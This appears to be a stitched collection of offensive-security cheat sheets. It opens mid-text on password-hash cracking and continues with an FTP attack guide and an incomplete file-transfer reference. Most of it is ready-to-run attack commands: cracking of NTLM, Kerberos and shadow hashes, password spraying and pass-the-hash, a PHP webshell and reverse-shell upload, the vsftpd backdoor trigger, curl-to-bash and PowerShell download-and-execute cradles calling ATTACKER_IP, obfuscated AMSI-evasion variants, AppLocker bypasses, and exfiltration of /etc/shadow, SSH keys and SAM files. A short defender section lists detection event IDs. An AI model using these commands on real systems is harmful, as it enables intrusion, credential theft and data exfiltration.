find /usr -name '*2john*' 2>/dev/null cracking specific hash types windows ntlm (from secretsdump, mimikatz, samdump2) secretsdump output format: administrator:500:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c::: extract only the nt hashes (field 4): cut -d: -f4 secretsdump.txt > nt_hashes.txt

# hashcat: mode 1000
hashcat -m 1000 nt_hashes.txt rockyou.txt
hashcat -m 1000 nt_hashes.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule
hashcat -m 1000 nt_hashes.txt rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule

# john
john --format=nt nt_hashes.txt --wordlist=rockyou.txt **ntlm cracking speed** on a modern gpu (rtx 4090):
- raw speed: ~300 billion hashes/second
- all 8-char passwords (?a × 8): ~68 trillion — cracked in ~4 minutes
- with rockyou + best64 rules: runs in seconds netntlmv2 (from responder / inveigh) responder captures look like: user::domain:challenge:response:blob # hashcat: mode 5600
hashcat -m 5600 netntlmv2.txt rockyou.txt
hashcat -m 5600 netntlmv2.txt rockyou.txt -r best64.rule

# john
john --format=netntlmv2 netntlmv2.txt --wordlist=rockyou.txt netntlmv2 cannot be used for pass-the-hash — you must crack it to get the cleartext password, then authenticate normally. this is why cracking speed matters here. netntlmv1 (legacy, faster to crack) # hashcat: mode 5500
hashcat -m 5500 netntlmv1.txt rockyou.txt

# netntlmv1 can also be cracked via crack.sh (rainbow tables, free for ctf/research) kerberoasting — tgs service tickets from impacket getuserspns.py: impacket-getuserspns domain.local/user:password -outputfile spn_hashes.txt the hashes start with `$krb5tgs$23$`: # hashcat: mode 13100 (rc4/ntlm) — most common
hashcat -m 13100 spn_hashes.txt rockyou.txt
hashcat -m 13100 spn_hashes.txt rockyou.txt -r best64.rule

# aes128: mode 19600
# aes256: mode 19700
hashcat -m 19700 spn_hashes.txt rockyou.txt

# john
john --format=krb5tgs spn_hashes.txt --wordlist=rockyou.txt as-rep roasting from impacket getnpusers.py (accounts with `dont_require_preauth`): impacket-getnpusers domain.local/ -usersfile users.txt -no-pass -outputfile asrep_hashes.txt hashes start with `$krb5asrep$23$`: # hashcat: mode 18200
hashcat -m 18200 asrep_hashes.txt rockyou.txt
hashcat -m 18200 asrep_hashes.txt rockyou.txt -r best64.rule

# john
john --format=krb5asrep asrep_hashes.txt --wordlist=rockyou.txt linux shadow file ($6$ / sha512crypt) # extract hashes from shadow
grep -v '!' /etc/shadow | grep -v '*' | cut -d: -f1,2 > shadow_hashes.txt

# hashcat: mode 1800 (sha512crypt)
hashcat -m 1800 shadow_hashes.txt rockyou.txt
# note: sha512crypt is slow — ~5,000/s on gpu. be patient.

# john (with unshadow)
unshadow /etc/passwd /etc/shadow > combined.txt
john combined.txt --wordlist=rockyou.txt bcrypt ($2a$ / $2b$) # hashcat: mode 3200
hashcat -m 3200 bcrypt_hashes.txt rockyou.txt
# bcrypt cost=12: ~30,000 attempts/second on gpu
# only practical against weak passwords — use focused wordlists

# john
john --format=bcrypt hash.txt --wordlist=rockyou.txt **bcrypt strategy:** don't throw rockyou at bcrypt. it'll take forever. use a targeted wordlist: cewl output + company name mutations + top 10k common passwords. wpa/wpa2 # capture with hcxdumptool then convert to hashcat format
hcxpcapngtool capture.pcapng -o wpa.hc22000

# or from airodump-ng .cap file:
hcxpcapngtool capture.cap -o wpa.hc22000

# crack: mode 22000 (wpa/wpa2 pmkid+eapol unified)
hashcat -m 22000 wpa.hc22000 rockyou.txt
hashcat -m 22000 wpa.hc22000 rockyou.txt -r best64.rule

# mask attack — 8-digit pins (common router defaults)
hashcat -m 22000 -a 3 wpa.hc22000 '?d?d?d?d?d?d?d?d' md5 / sha1 (web app databases) # raw md5: mode 0
hashcat -m 0 md5_hashes.txt rockyou.txt -r best64.rule

# raw sha1: mode 100
hashcat -m 100 sha1_hashes.txt rockyou.txt -r best64.rule

# md5($pass.$salt) — check the format carefully
hashcat -m 10 'hash:salt' rockyou.txt

# sha1($pass.$salt)
hashcat -m 110 'hash:salt' rockyou.txt

# double md5
hashcat -m 2600 hashes.txt rockyou.txt online resources and rainbow tables for fast hashes (md5, sha1, ntlm) without a local gpu, online lookup tables cover billions of precomputed hashes. free hash lookups https://hashes.com/en/decrypt/hash
https://crackstation.net
https://md5decrypt.net
https://hashtoolkit.com
https://www.nitrxgen.net/md5db/ crackstation covers 15 billion unique hashes from leaked databases. paste up to 20 hashes at once. free. works instantly for common passwords. hashes.com maintains an actively updated recovered hash database. also runs gpu cracking jobs on submitted hashes (paid tier). upload hashfile, crack for free if it's in the database. crack.sh (netntlmv1) specialised in cracking netntlmv1 via rainbow tables — often cracks in seconds. submit the challenge/response at: https://crack.sh/get-cracking/ opsec warning never upload hashes from a live engagement to public services. the hash is the credential for ntlm — if it's recovered and logged by the service, it's exposed. use local cracking for sensitive engagements. cracking at scale — multiple hashes when you have a full domain hash dump (hundreds or thousands of ntlm hashes), the approach changes. prepare the hash file # from secretsdump output — extract all nt hashes
grep -a ':::' secretsdump.txt | cut -d: -f4 | sort -u > nt_hashes.txt

# or: keep username:nthash format for context after cracking
grep -a ':::' secretsdump.txt | awk -f: '{print $1":"$4}' | sort -u > nt_with_users.txt

# count
wc -l nt_hashes.txt full campaign in order # pass 1 — wordlist only (catches ~30% in seconds)
hashcat -m 1000 nt_hashes.txt /usr/share/wordlists/rockyou.txt -o cracked.txt --outfmt 2

# pass 2 — rockyou + best64 rules
hashcat -m 1000 nt_hashes.txt /usr/share/wordlists/rockyou.txt \
  -r /usr/share/hashcat/rules/best64.rule --potfile-path hashcat.pot

# pass 3 — rockyou + dive rules
hashcat -m 1000 nt_hashes.txt /usr/share/wordlists/rockyou.txt \
  -r /usr/share/hashcat/rules/dive.rule --potfile-path hashcat.pot

# pass 4 — target wordlist + rules
hashcat -m 1000 nt_hashes.txt target_wordlist.txt \
  -r /usr/share/hashcat/rules/best64.rule --potfile-path hashcat.pot

# pass 5 — hybrid: wordlist + 4 digits
hashcat -m 1000 -a 6 nt_hashes.txt rockyou.txt '?d?d?d?d' --potfile-path hashcat.pot

# pass 6 — mask: common 8-9 char corporate patterns
hashcat -m 1000 -a 3 nt_hashes.txt '?u?l?l?l?l?l?d?d' --potfile-path hashcat.pot
hashcat -m 1000 -a 3 nt_hashes.txt '?u?l?l?l?l?l?d?d?s' --potfile-path hashcat.pot

# show all cracked
hashcat -m 1000 nt_hashes.txt --show > cracked_passwords.txt analyse password patterns in cracked results # length distribution
awk -f: '{print length($2)}' cracked_passwords.txt | sort | uniq -c | sort -rn

# common base words
awk -f: '{print $2}' cracked_passwords.txt | tr '[:upper:]' '[:lower:]' | \
  sed 's/[0-9!@#$%^&*]//g' | sort | uniq -c | sort -rn | head 20

# policy enforcement check
awk -f: '{print $2}' cracked_passwords.txt | \
  grep -cp '^(?=.*[a-z])(?=.*[a-z])(?=.*\d)(?=.*[!@#$%]).'   # meets complexity report metrics # total hashes
total=$(wc -l < nt_hashes.txt)
# cracked count
cracked=$(hashcat -m 1000 nt_hashes.txt --show | wc -l)
# percentage
echo "cracked: $cracked / $total ($(( cracked * 100 / total ))%)" password spraying vs cracking these are complementary techniques — understanding when to use each is important. cracking - you already **have the hash** (post-exploitation)
- offline, no lockout risk, limited only by your hardware
- goal: recover plaintext for reuse, credential stuffing, or reporting password spraying - you **don't have hashes** yet (pre-exploitation / lateral movement)
- online, against a live service — lockout risk is real
- try one or two passwords against many accounts
- goal: initial access or lateral movement # kerbrute — spray against kerberos (no domain account required)
kerbrute passwordspray -d domain.local --dc dc_ip users.txt 'password2024!'

# crackmapexec — spray against smb
crackmapexec smb dc_ip -u users.txt -p 'password2024!' --continue-on-success

# spraying best practices:
# - one password per hour maximum
# - check lockout threshold first: net accounts /domain
# - use passwords that meet policy (complexity)
# - common spray candidates: season+year (summer2024!), company+year using cracked passwords for lateral movement # cracked ntlm → use hash directly (no need to crack)
crackmapexec smb target -u administrator -h 8846f7eaee8fb117ad06bdd830b7586c
evil-winrm -i target -u administrator -h 8846f7eaee8fb117ad06bdd830b7586c
impacket-psexec administrator@target -hashes :8846f7eaee8fb117ad06bdd830b7586c

# cracked password → test on all hosts
crackmapexec smb 10.10.10.0/24 -u john -p 'summer2024!' --continue-on-success

# check for password reuse across services
crackmapexec winrm 10.10.10.0/24 -u john -p 'summer2024!'
crackmapexec ssh 10.10.10.0/24 -u john -p 'summer2024!' hashcat performance tuning # check benchmark for a specific mode
hashcat -m 1000 -b
hashcat -m 5600 -b
hashcat -b   # all modes

# workload profile (-w)
# -w 1  = low (laptop, keep ui responsive)
# -w 2  = default
# -w 3  = high (dedicated cracking box)
# -w 4  = nightmare (max gpu, system may be unresponsive)
hashcat -m 1000 -w 3 hashes.txt rockyou.txt

# optimised kernel (-o)
# faster but restricts max password length to 32 chars
hashcat -m 1000 -o hashes.txt rockyou.txt

# use specific gpu
hashcat -m 1000 -d 1 hashes.txt rockyou.txt   # device 1
hashcat -m 1000 -d 1,2 hashes.txt rockyou.txt # both gpus

# status interval
hashcat -m 1000 --status --status-timer 10 hashes.txt rockyou.txt

# pause / resume during run
# press p to pause, r to resume, s for status, q to quit+save

# runtime limit (useful for queued jobs)
hashcat -m 1000 --runtime 3600 hashes.txt rockyou.txt  # stop after 1 hour performance expectations practical workflow — full engagement scenario scenario: you've dumped a domain controller # step 1 — extract hashes with secretsdump
impacket-secretsdump domain.local/administrator@dc_ip -just-dc-ntlm -outputfile dump

# step 2 — prepare hash file
grep ':::' dump.ntds | cut -d: -f4 | sort -u > nt_hashes.txt
wc -l nt_hashes.txt   # note total count

# step 3 — quick online check (non-sensitive lab only)
# paste into crackstation.net or hashes.com

# step 4 — local cracking campaign
hashcat -m 1000 nt_hashes.txt rockyou.txt -o -w 3
hashcat -m 1000 nt_hashes.txt rockyou.txt -r best64.rule -o -w 3
hashcat -m 1000 nt_hashes.txt target_cewl.txt -r best64.rule -o -w 3
hashcat -m 1000 -a 6 nt_hashes.txt rockyou.txt '?d?d?d?d' -o -w 3
hashcat -m 1000 -a 3 nt_hashes.txt '?u?l?l?l?l?l?d?d?s' -o -w 3

# step 5 — see what cracked
hashcat -m 1000 nt_hashes.txt --show > cracked.txt
cat cracked.txt | awk -f: '{print $2}' | sort

# step 6 — map usernames to cracked passwords
# dump.ntds has: username:rid:lm:nt:::
while ifs= read -r hash; do
  user=$(grep "$hash" dump.ntds | cut -d: -f1)
  echo "$user : $hash"
done < <(awk -f: '{print $1}' cracked.txt) > user_passwords.txt

# step 7 — identify high-value accounts
grep -i 'admin\|da \|krbtgt\|svc_\|service' user_passwords.txt

# step 8 — test cracked creds
crackmapexec smb dc_ip -u user_passwords.txt -p user_passwords.txt --no-bruteforce scenario: responder captures on a network # responder running on interface eth0
responder -i eth0 -wrf

# hashes captured in /usr/share/responder/logs/
ls /usr/share/responder/logs/

# crack netntlmv2
hashcat -m 5600 /usr/share/responder/logs/http-ntlmv2-*.txt rockyou.txt
hashcat -m 5600 /usr/share/responder/logs/smb-ntlmv2-*.txt rockyou.txt -r best64.rule

# or john
john --format=netntlmv2 /usr/share/responder/logs/smb-ntlmv2*.txt --wordlist=rockyou.txt defence and detection **for defenders — what weak password policies look like to an attacker:** **why complexity requirements mostly fail:**

users predictably satisfy complexity with patterns hashcat rules already encode:
- `password1!` — dictionary word, capitalised, digit, special
- `companyname2024!` — company + year + special
- `p@ssw0rd` — leet substitutions baked into rules

**what actually works:** **detecting cracking activity (from defender side):**
- `4625` — failed logon (spray attempts)
- `4771` — kerberos pre-auth failed (spray or kerbrute)
- `4769` — kerberos service ticket requested (kerberoasting — unusual spns)
- `4768` — as-req without pre-auth (as-rep roasting)
- unusual volume of ntlm authentication events
- ldap queries enumerating users with spn set

**have i been pwned:** https://haveibeenpwned.com/passwords check if a password appears in known breaches. microsoft entra id (azure ad) integrates hibp to block known-breached passwords at set-time.

title: FTP — Field Guide
summary: Anonymous login, shell commands, curl one-liners, and a CTF workflow covering banner grabbing, shell upload, and the vsftpd backdoor.
body:
ftp — field guide anonymous login, shell commands, curl one-liners, and a ctf workflow covering banner grabbing, shell upload, and the vsftpd backdoor. tools ftp recon file-transfer tools network what is ftp ftp (*file transfer protocol*) is a decades-old protocol for transferring files between a client and a server over tcp. it runs on **port 21** (control) and uses a second dynamic port for data transfer.

despite its age — and the fact that it transmits credentials in **plaintext** — ftp is still widespread. you'll find it on embedded devices, legacy servers, printers, and almost every hackthebox / ctf machine that involves file access. ftp sends your username and password in cleartext over the wire. on a real network, prefer **sftp** (ssh) or **ftps** (ftp over tls). for testing and ctf use, plain ftp is fine. connecting the built-in `ftp` client is available on every linux/macos system. for scripting and ctf work, **`netcat`** and **`curl`** are also useful. # built-in ftp client
ftp <host>
ftp 10.10.10.5

# connect to a non-standard port
ftp -p 2121 10.10.10.5

# one-liner with curl (no interactive session)
curl ftp://10.10.10.5/
curl ftp://user:pass@10.10.10.5/

# raw connection via netcat (useful for banner grabbing)
nc -nv 10.10.10.5 21 anonymous login many servers allow **anonymous ftp** — a legacy feature that lets anyone log in without credentials. it's a goldmine in ctfs and common on misconfigured production servers.

username: `anonymous`  
password: anything (usually an email address, but blank works too) ftp 10.10.10.5
# when prompted:
# name: anonymous
# password: <blank or anything>

# or with curl — no credentials needed
curl ftp://10.10.10.5/

# check with nmap first
nmap --script ftp-anon -p 21 10.10.10.5 interactive shell commands once connected, the ftp shell accepts these commands: ftp 10.10.10.5
# login...

ftp> ls -la              # list all files including hidden
ftp> binary              # always set binary before downloading
ftp> get secret.txt      # download single file
ftp> prompt              # disable confirmation for bulk download
ftp> mget *              # download everything
ftp> cd uploads          # navigate to a directory
ftp> put shell.php       # upload a file
ftp> bye active vs passive mode ftp uses two tcp connections: one for commands (port 21), one for data.

**active mode** — the server initiates the data connection back to the client. blocked by most firewalls and nat.

**passive mode** (`pasv`) — the client initiates both connections. works through firewalls. **use this by default.** # in the ftp shell
ftp> passive
passive mode on.

# with curl — passive is the default
curl --ftp-pasv ftp://10.10.10.5/

# with lftp (better client, passive by default)
lftp -e 'set ftp:passive-mode on' -u user,pass 10.10.10.5 curl for ftp `curl` is often better than the interactive `ftp` client for scripting — it supports credentials, listing, upload, and download in one line. # list directory
curl ftp://10.10.10.5/
curl ftp://user:pass@10.10.10.5/uploads/

# download a file
curl ftp://10.10.10.5/flag.txt -o flag.txt

# download all files matching a pattern
curl ftp://10.10.10.5/backups/ | grep -op '\s+\.sql' | while read f; do
  curl ftp://10.10.10.5/backups/$f -o
done

# upload a file
curl -t shell.php ftp://user:pass@10.10.10.5/uploads/

# append to a file
curl -t addme.txt -a ftp://user:pass@10.10.10.5/existing.txt

# verbose — shows banner, auth exchange, server responses
curl -v ftp://10.10.10.5/ lftp — better interactive client `lftp` is a modern ftp/sftp client with tab-completion, recursive transfers, and mirroring. install: `sudo apt install lftp`. # connect
lftp ftp://user:pass@10.10.10.5

# mirror entire remote directory to local
lftp -e 'mirror /remote/dir /local/dir; bye' ftp://10.10.10.5

# mirror local directory to remote (upload)
lftp -e 'mirror -r /local/dir /remote/dir; bye' ftp://user:pass@10.10.10.5

# non-interactive download
lftp -e 'get /secret/file.zip; bye' ftp://anonymous@10.10.10.5 real-world use cases **audit a server for anonymous access and exposed files:** # check if anon login is allowed
nmap --script ftp-anon,ftp-bounce,ftp-syst -p 21 10.0.0.0/24

# if allowed, enumerate everything
curl ftp://anonymous:@10.0.0.5/ -v 2>&1 | grep -v '^[{}]'

# recursively download all readable files
wget -m ftp://anonymous:anon@10.0.0.5/ **automated backup via cron** — a common real-world ftp use case: #!/bin/bash
host=backup.internal
user=ftpuser
pass=secret
file=/var/backups/db_$(date +%y%m%d).sql.gz

mysqldump mydb | gzip > $file

curl -s -t $file ftp://$user:$pass@$host/backups/ && echo 'backup uploaded' **check ftp banner for version info** — often reveals cves: # netcat — shows raw banner
nc -nv 10.10.10.5 21

# nmap service detection
nmap -sv -p 21 10.10.10.5

# curl verbose shows server software
curl -v ftp://10.10.10.5/ 2>&1 | grep -i 'server\|220' ctf & hackthebox workflow ftp on a ctf box usually means one of three things: anonymous login with a flag/credential file, writable directory for shell upload, or a vulnerable ftp daemon with a known cve. export ip=10.10.10.5

# 1. grab the banner — check software and version
nc -nv $ip 21

# 2. try anonymous login
ftp $ip
# name: anonymous  password: <enter>

# 3. if anon works — list everything
ftp> ls -la
ftp> binary
ftp> prompt off
ftp> mget *

# 4. check write permission — try uploading a test file
ftp> put /etc/hostname testfile.txt

# 5. if credentials found elsewhere — try them here
ftp $ip
# name: admin  password: <found password>

# 6. check for known cve (vsftpd 2.3.4 backdoor, proftpd mod_copy, etc.)
searchsploit vsftpd
nmap --script ftp-vsftpd-backdoor -p 21 $ip # if the ftp directory is web-accessible (common on htb)
# 1. create a php/aspx webshell
echo '<?php system($_get["cmd"]); ?>' > shell.php

# 2. upload via ftp
curl -t shell.php ftp://anonymous:@$ip/

# 3. trigger via http
curl http://$ip/shell.php?cmd=id

# or upload a reverse shell payload
msfvenom -p php/reverse_php lhost=10.10.14.5 lport=4444 -f raw > rev.php
curl -t rev.php ftp://anonymous:@$ip/
# set up listener: nc -lvnp 4444 # the vsftpd 2.3.4 backdoor opens a shell on port 6200
# trigger: log in with a username ending in ':)'
ftp $ip
# name: anything:)
# password: anything

# then connect to the backdoor port
nc -nv $ip 6200

# or use metasploit
use exploit/unix/ftp/vsftpd_234_backdoor
set rhosts $ip
run **always try `anonymous` login first** on ctf boxes — it works more often than you'd expect.  
**always run `binary` mode** before downloading executables, images, or archives.  
**`mget *`** with `prompt off` dumps the whole directory in one go.  
**curl** is better than `ftp` for scripting and one-liners.  
**lftp** is better than `ftp` for interactive use and bulk transfers.  
**port 21 open?** check `searchsploit <daemon-name>` after grabbing the banner.

title: File Transfers — Moving Files on Windows and Linux
summary: Every reliable technique for uploading and downloading files during an engagement: Python servers, PowerShell cradles, certutil, base64 encoding, netcat, SMB, S
body:
file transfers — moving files on windows and linux every reliable technique for uploading and downloading files during an engagement: python servers, powershell cradles, certutil, base64 encoding, netcat, smb, scp, lolbas, and evasion considerations. notes file-transfer windows linux lolbas gtfobins red-team notes moving files between machines is one of the most routine tasks on an engagement — dropping tools, pulling loot, staging payloads. it sounds trivial until av blocks your download, the target has no internet access, your reverse shell has no tty, or every standard binary is missing.

this guide is a complete reference for every reliable file transfer technique on both linux and windows, with the opsec context that determines which one you reach for first. setting up your attacker-side http server most transfer techniques pull files from an http server you control. get one running first. python (always available) # python 3 — serves current directory on port 80
python3 -m http.server 80

# specific port
python3 -m http.server 8000

# specific directory
python3 -m http.server 80 --directory /opt/tools

# python 2 (older systems)
python2 -m simplehttpserver 80 php php -s 0.0.0.0:80
php -s 0.0.0.0:8000 -t /opt/tools ruby ruby -run -e httpd . -p 80 nginx (one-shot static serve) sudo nginx -p /opt/tools -c <(echo 'events{} http{server{listen 80; root .;}}') upload-capable server (for exfil) when you need the target to post files back to you: # uploadserver python module
pip3 install uploadserver
python3 -m uploadserver 80

# files upload to: post http://your_ip/upload
# then fetch at:   get  http://your_ip/[filename] https (bypasses some content inspection) # self-signed cert
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 1 -nodes -subj '/cn=localhost'
python3 -c "
import ssl, http.server
ctx = ssl.sslcontext(ssl.protocol_tls_server)
ctx.load_cert_chain('cert.pem', 'key.pem')
server = http.server.httpserver(('0.0.0.0', 443), http.server.simplehttprequesthandler)
server.socket = ctx.wrap_socket(server.socket, server_side=true)
server.serve_forever()
" linux — downloading files wget wget http://attacker_ip/linpeas.sh
wget http://attacker_ip/tool -o /tmp/tool
wget -q http://attacker_ip/tool -o /dev/shm/tool  # quieter, in-memory path

# no output to disk — pipe directly to bash
wget -q -o - http://attacker_ip/shell.sh | bash curl curl http://attacker_ip/linpeas.sh -o /tmp/linpeas.sh
curl -s http://attacker_ip/tool -o

# pipe to bash
curl -s http://attacker_ip/shell.sh | bash

# follow redirects, ignore tls errors (https server)
curl -sk https://attacker_ip/tool -o /tmp/tool

# resume partial download
curl -c - http://attacker_ip/bigfile -o /tmp/bigfile python (no wget/curl) python3 -c "import urllib.request; urllib.request.urlretrieve('http://attacker_ip/tool', '/tmp/tool')"

# python 2
python2 -c "import urllib; urllib.urlretrieve('http://attacker_ip/tool', '/tmp/tool')"

# one-liner with exec
python3 -c "exec(__import__('urllib.request',fromlist=['urlopen']).urlopen('http://attacker_ip/shell.py').read())" bash `/dev/tcp` (no external tools at all) exec 3<>/dev/tcp/attacker_ip/80
echo -e 'get /tool http/1.0\r\nhost: attacker_ip\r\n\r\n' >&3
cat <&3 > /tmp/tool this uses bash's built-in network capability — no wget, curl, or python required. works on very minimal systems. netcat # attacker sends:
nc -lvnp 4444 < tool

# target receives:
nc attacker_ip 4444 > /tmp/tool scp (when you have ssh credentials) # push to target
scp tool user@target:/tmp/tool

# pull from target
scp user@target:/etc/shadow ./shadow

# recursive directory
scp -r user@target:/var/www/html ./loot/ rsync rsync -av tool user@target:/tmp/
rsync -av user@target:/home/user/.ssh ./loot/ssh/ linux — uploading / exfiltrating files curl post to uploadserver curl -f 'files=@/etc/shadow' http://attacker_ip/upload
curl -f 'files=@/home/user/.ssh/id_rsa' http://attacker_ip/upload netcat exfil # attacker receives:
nc -lvnp 4444 > loot.tar.gz

# target sends:
tar czf - /home/user | nc attacker_ip 4444

# or a single file
nc attacker_ip 4444 < /etc/shadow scp pull (from attacker with target creds) scp -i target_key user@target:/etc/shadow ./ base64 over terminal when you only have a shell and no network channels (e.g., inside a web shell): # on target — encode the file
base64 /etc/shadow

# copy the output, decode on attacker
echo 'base64output...' | base64 -d > shadow for binary files: # target
base64 /usr/bin/bash

# attacker
echo 'base64...' | base64 -d > bash_copy
chmod +x bash_copy smb (when samba or impacket is available) # set up smb share on attacker (impacket)
impacket-smbserver share /opt/tools -smb2support

# target connects
# linux mount:
mount -t cifs //attacker_ip/share /mnt -o user=,password=
cp /etc/shadow /mnt/
umount /mnt windows — downloading files windows has several built-in download primitives that work without installing anything. some are better known to defenders than others. powershell — downloadfile # standard
(new-object net.webclient).downloadfile('http://attacker_ip/tool.exe', 'c:\windows\temp\tool.exe')

# short alias
iwr http://attacker_ip/tool.exe -outfile c:\windows\temp\tool.exe

# invoke-webrequest alias
invoke-webrequest -uri http://attacker_ip/tool.exe -outfile c:\windows\temp\tool.exe

# https (ignore cert errors)
[system.net.servicepointmanager]::servercertificatevalidationcallback = {$true}
(new-object net.webclient).downloadfile('https://attacker_ip/tool.exe', 'c:\windows\temp\tool.exe') powershell — downloadstring (fileless) # download and execute in memory — no file on disk
iex (new-object net.webclient).downloadstring('http://attacker_ip/shell.ps1')

# iex alias
iex ((new-object net.webclient).downloadstring('http://attacker_ip/amsibypass.ps1'))

# cradle with proxy bypass
$wc = new-object net.webclient
$wc.proxy = [net.webproxy]::getdefaultproxy()
$wc.proxy.credentials = [net.credentialcache]::defaultcredentials
iex $wc.downloadstring('http://attacker_ip/shell.ps1') powershell — bits (background intelligent transfer) start-bitstransfer -source 'http://attacker_ip/tool.exe' -destination 'c:\windows\temp\tool.exe' bits is a legitimate windows service used for windows update — often whitelisted and less suspicious than raw webclient. certutil.exe certutil -urlcache -split -f http://attacker_ip/tool.exe c:\windows\temp\tool.exe

:: decode base64 file (certutil as b64 decoder)
certutil -decode encoded.b64 tool.exe **opsec note:** `certutil -urlcache` is heavily monitored. many edrs alert on it immediately. use as a fallback. bitsadmin.exe (legacy, windows 7/2008) bitsadmin /transfer job http://attacker_ip/tool.exe c:\windows\temp\tool.exe curl.exe (windows 10 1803+) curl http://attacker_ip/tool.exe -o c:\windows\temp\tool.exe
curl -sk https://attacker_ip/tool.exe -o c:\windows\temp\tool.exe wget.exe (windows 10 1903+) wget http://attacker_ip/tool.exe -o c:\windows\temp\tool.exe mshta.exe mshta http://attacker_ip/shell.hta `mshta` runs hta (html application) files — an old but still-working execution vector. the hta can contain vbscript/jscript. regsvr32.exe (squiblydoo) regsvr32 /s /n /u /i:http://attacker_ip/shell.sct scrobj.dll executes a scriptlet (`.sct`) — com object loaded from url. classic applocker bypass. wmic.exe wmic os get /format:"http://attacker_ip/shell.xsl" executes xsl transform from url — another applocker bypass. powershell webdav # mount a webdav share and copy
net use z: http://attacker_ip/
copy z:\tool.exe c:\windows\temp\tool.exe
net use z: /delete python webdav server: pip3 install wsgidav cheroot
wsgidav --host 0.0.0.0 --port 80 --root /opt/tools --auth anonymous windows — uploading / exfiltrating files powershell — upload via http post # to python uploadserver
$file = 'c:\windows\system32\config\sam'
$uri  = 'http://attacker_ip/upload'
invoke-restmethod -uri $uri -method post -infile $file -contenttype 'multipart/form-data'

# alternatively with webclient
$wc = new-object net.webclient
$wc.uploadfile($uri, $file) base64 encode over shell # encode file to base64 and print
[convert]::tobase64string([io.file]::readallbytes('c:\windows\repair\sam'))

# for large files — chunk it
$b = [io.file]::readallbytes('c:\secret.docx')
[convert]::tobase64string($b) | out-file c:\windows\temp\out.b64
type c:\windows\temp\out.b64 decode on attacker: echo 'base64...' | base64 -d > sam smb — copy over impacket share # attacker runs:
# impacket-smbserver share /tmp/loot -smb2support -username user -password pass

# target copies file out:
copy c:\windows\repair\sam \\attacker_ip\share\sam
copy c:\windows\repair\system \\attacker_ip\share\system

# or with credentials
net use \\attacker_ip\share /user:user pass
copy c:\secret.docx \\attacker_ip\share\secret.docx
net use \\attacker_ip\share /delete sftp / scp (if ssh client is available) scp c:\windows\repair\sam user@attacker_ip:/tmp/sam ssh client ships with windows 10 1803+ (`c:\windows\system32\openssh\scp.exe`). ftp :: create ftp command file
echo open attacker_ip > ftp.txt
echo user anonymous >> ftp.txt
echo pass >> ftp.txt
echo put c:\secret.docx >> ftp.txt
echo bye >> ftp.txt
ftp -s:ftp.txt attacker runs: python3 -m pyftpdlib -p 21 -w   # -w enables write netcat exfil :: attacker listener:
:: nc -lvnp 4444 > loot.zip

:: target sends:
nc attacker_ip 4444 < c:\loot.zip

:: if nc isn't available, use powershell tcp
powershell -c "$c=new-object net.sockets.tcpclient('attacker_ip',4444);$s=$c.getstream();$f=[io.file]::readallbytes('c:\secret.docx');$s.write($f,0,$f.length);$c.close()" base64 transfer — the universal fallback when no direct network channel exists between attacker and target — you're operating through a web shell, a restricted shell, or a blind command injection — base64 encoding lets you transfer files entirely through text output. full workflow: attacker → target (binary tool) **attacker — encode and serve:** base64 -w 0 /opt/tools/linpeas.sh > /var/www/html/linpeas.b64
python3 -m http.server 80 **target (linux) — download text and decode:** curl -s http://attacker_ip/linpeas.b64 | base64 -d > /tmp/linpeas.sh
chmod +x /tmp/linpeas.sh **target (windows) — download text and decode:** $b64 = (new-object net.webclient).downloadstring('http://attacker_ip/tool.b64')
$bytes = [convert]::frombase64string($b64.trim())
[io.file]::writeallbytes('c:\windows\temp\tool.exe', $bytes) paste-via-terminal (fully air-gapped) when you can only type commands and read output — no http:

**attacker:** base64 -w 0 shell.sh
# copy the output **target:** echo 'paste_base64_here' | base64 -d > /tmp/shell.sh for large files, split into 76-char chunks to avoid terminal buffer issues: base64 shell.sh | split -b 500 - chunk_
for f in chunk_*; do cat $f; echo '---'; done verify integrity after transfer # both sides run:
md5sum /opt/tools/linpeas.sh
md5sum /tmp/linpeas.sh
# hashes must match smb file transfers (windows-centric) smb is the most natural file transfer protocol on windows networks — no firewall exception required if port 445 is already open inbound. impacket smb server # unauthenticated (older smb1 behavior)
impacket-smbserver share /opt/tools

# smb2 (required for modern windows)
impacket-smbserver share /opt/tools -smb2support

# with authentication (avoids "access denied" on some targets)
impacket-smbserver share /opt/tools -smb2support -username user -password passw0rd using the share from windows :: list share
dir \\attacker_ip\share

:: download a file
copy \\attacker_ip\share\winpeas.exe c:\windows\temp\winpeas.exe

:: execute directly from share (in-memory, no copy to disk)
\\attacker_ip\share\tool.exe

:: mount as drive letter
net use z: \\attacker_ip\share
z:
dir
copy winpeas.exe c:\windows\temp\
net use z: /delete **execute in memory directly from smb** — the tool never lands on the target disk: \\attacker_ip\share\mimikatz.exe "lsadump::sam" exit this is the highest-opsec execution method on windows — no file written, no av scan trigger on disk writes. smb with credentials (authenticated share) net use \\attacker_ip\share /user:user passw0rd
copy c:\windows\repair\sam \\attacker_ip\share\
net use \\attacker_ip\share /delete powershell with credentials $cred = new-object pscredential('user', (convertto-securestring 'passw0rd' -asplaintext -force))
new-psdrive -name z -psprovider filesystem -root \\attacker_ip\share -credential $cred
copy-item z:\winpeas.exe c:\windows\temp\
remove-psdrive z lolbas — living off the land (windows) lolbas (living off the land binaries and scripts) are built-in windows executables that can download, execute, or encode files — useful when your own tools are blocked.

full list: https://lolbas-project.github.io download binaries powershell execution cradles (obfuscation variants) # standard
iex(new-object net.webclient).downloadstring('http://ip/s.ps1')

# split and concat (bypass naive string matching)
$a='net.w';$b='ebclient';iex(new-object "$a$b").downloadstring('http://ip/s.ps1')

# encoded command (bypass -command log monitoring)
$cmd = 'iex(new-object net.webclient).downloadstring("http://ip/s.ps1")'
[convert]::tobase64string([text.encoding]::unicode.getbytes($cmd))
# → paste as: powershell -encodedcommand base64here

# window hidden
powershell -w hidden -nop -noni -enc base64here gzip + base64 cradle (amsi evasion) $s = (new-object net.webclient).downloaddata('http://ip/tool.gz')
$is = new-object io.memorystream(,$s)
$ds = new-object io.compression.gzipstream($is,[io.compression.compressionmode]::decompress)
$sr = new-object io.streamreader($ds)
$e = $sr.readtoend()
iex $e gtfobins — file transfer binaries (linux) full list: https://gtfobins.github.io — filter by "file download" and "file upload" capabilities. download with unexpected binaries # openssl
openssl s_client -connect attacker_ip:443 < /dev/null | openssl base64 -d -a > /tmp/tool

# php
php -r "file_put_contents('/tmp/tool', file_get_contents('http://attacker_ip/tool'));"

# perl
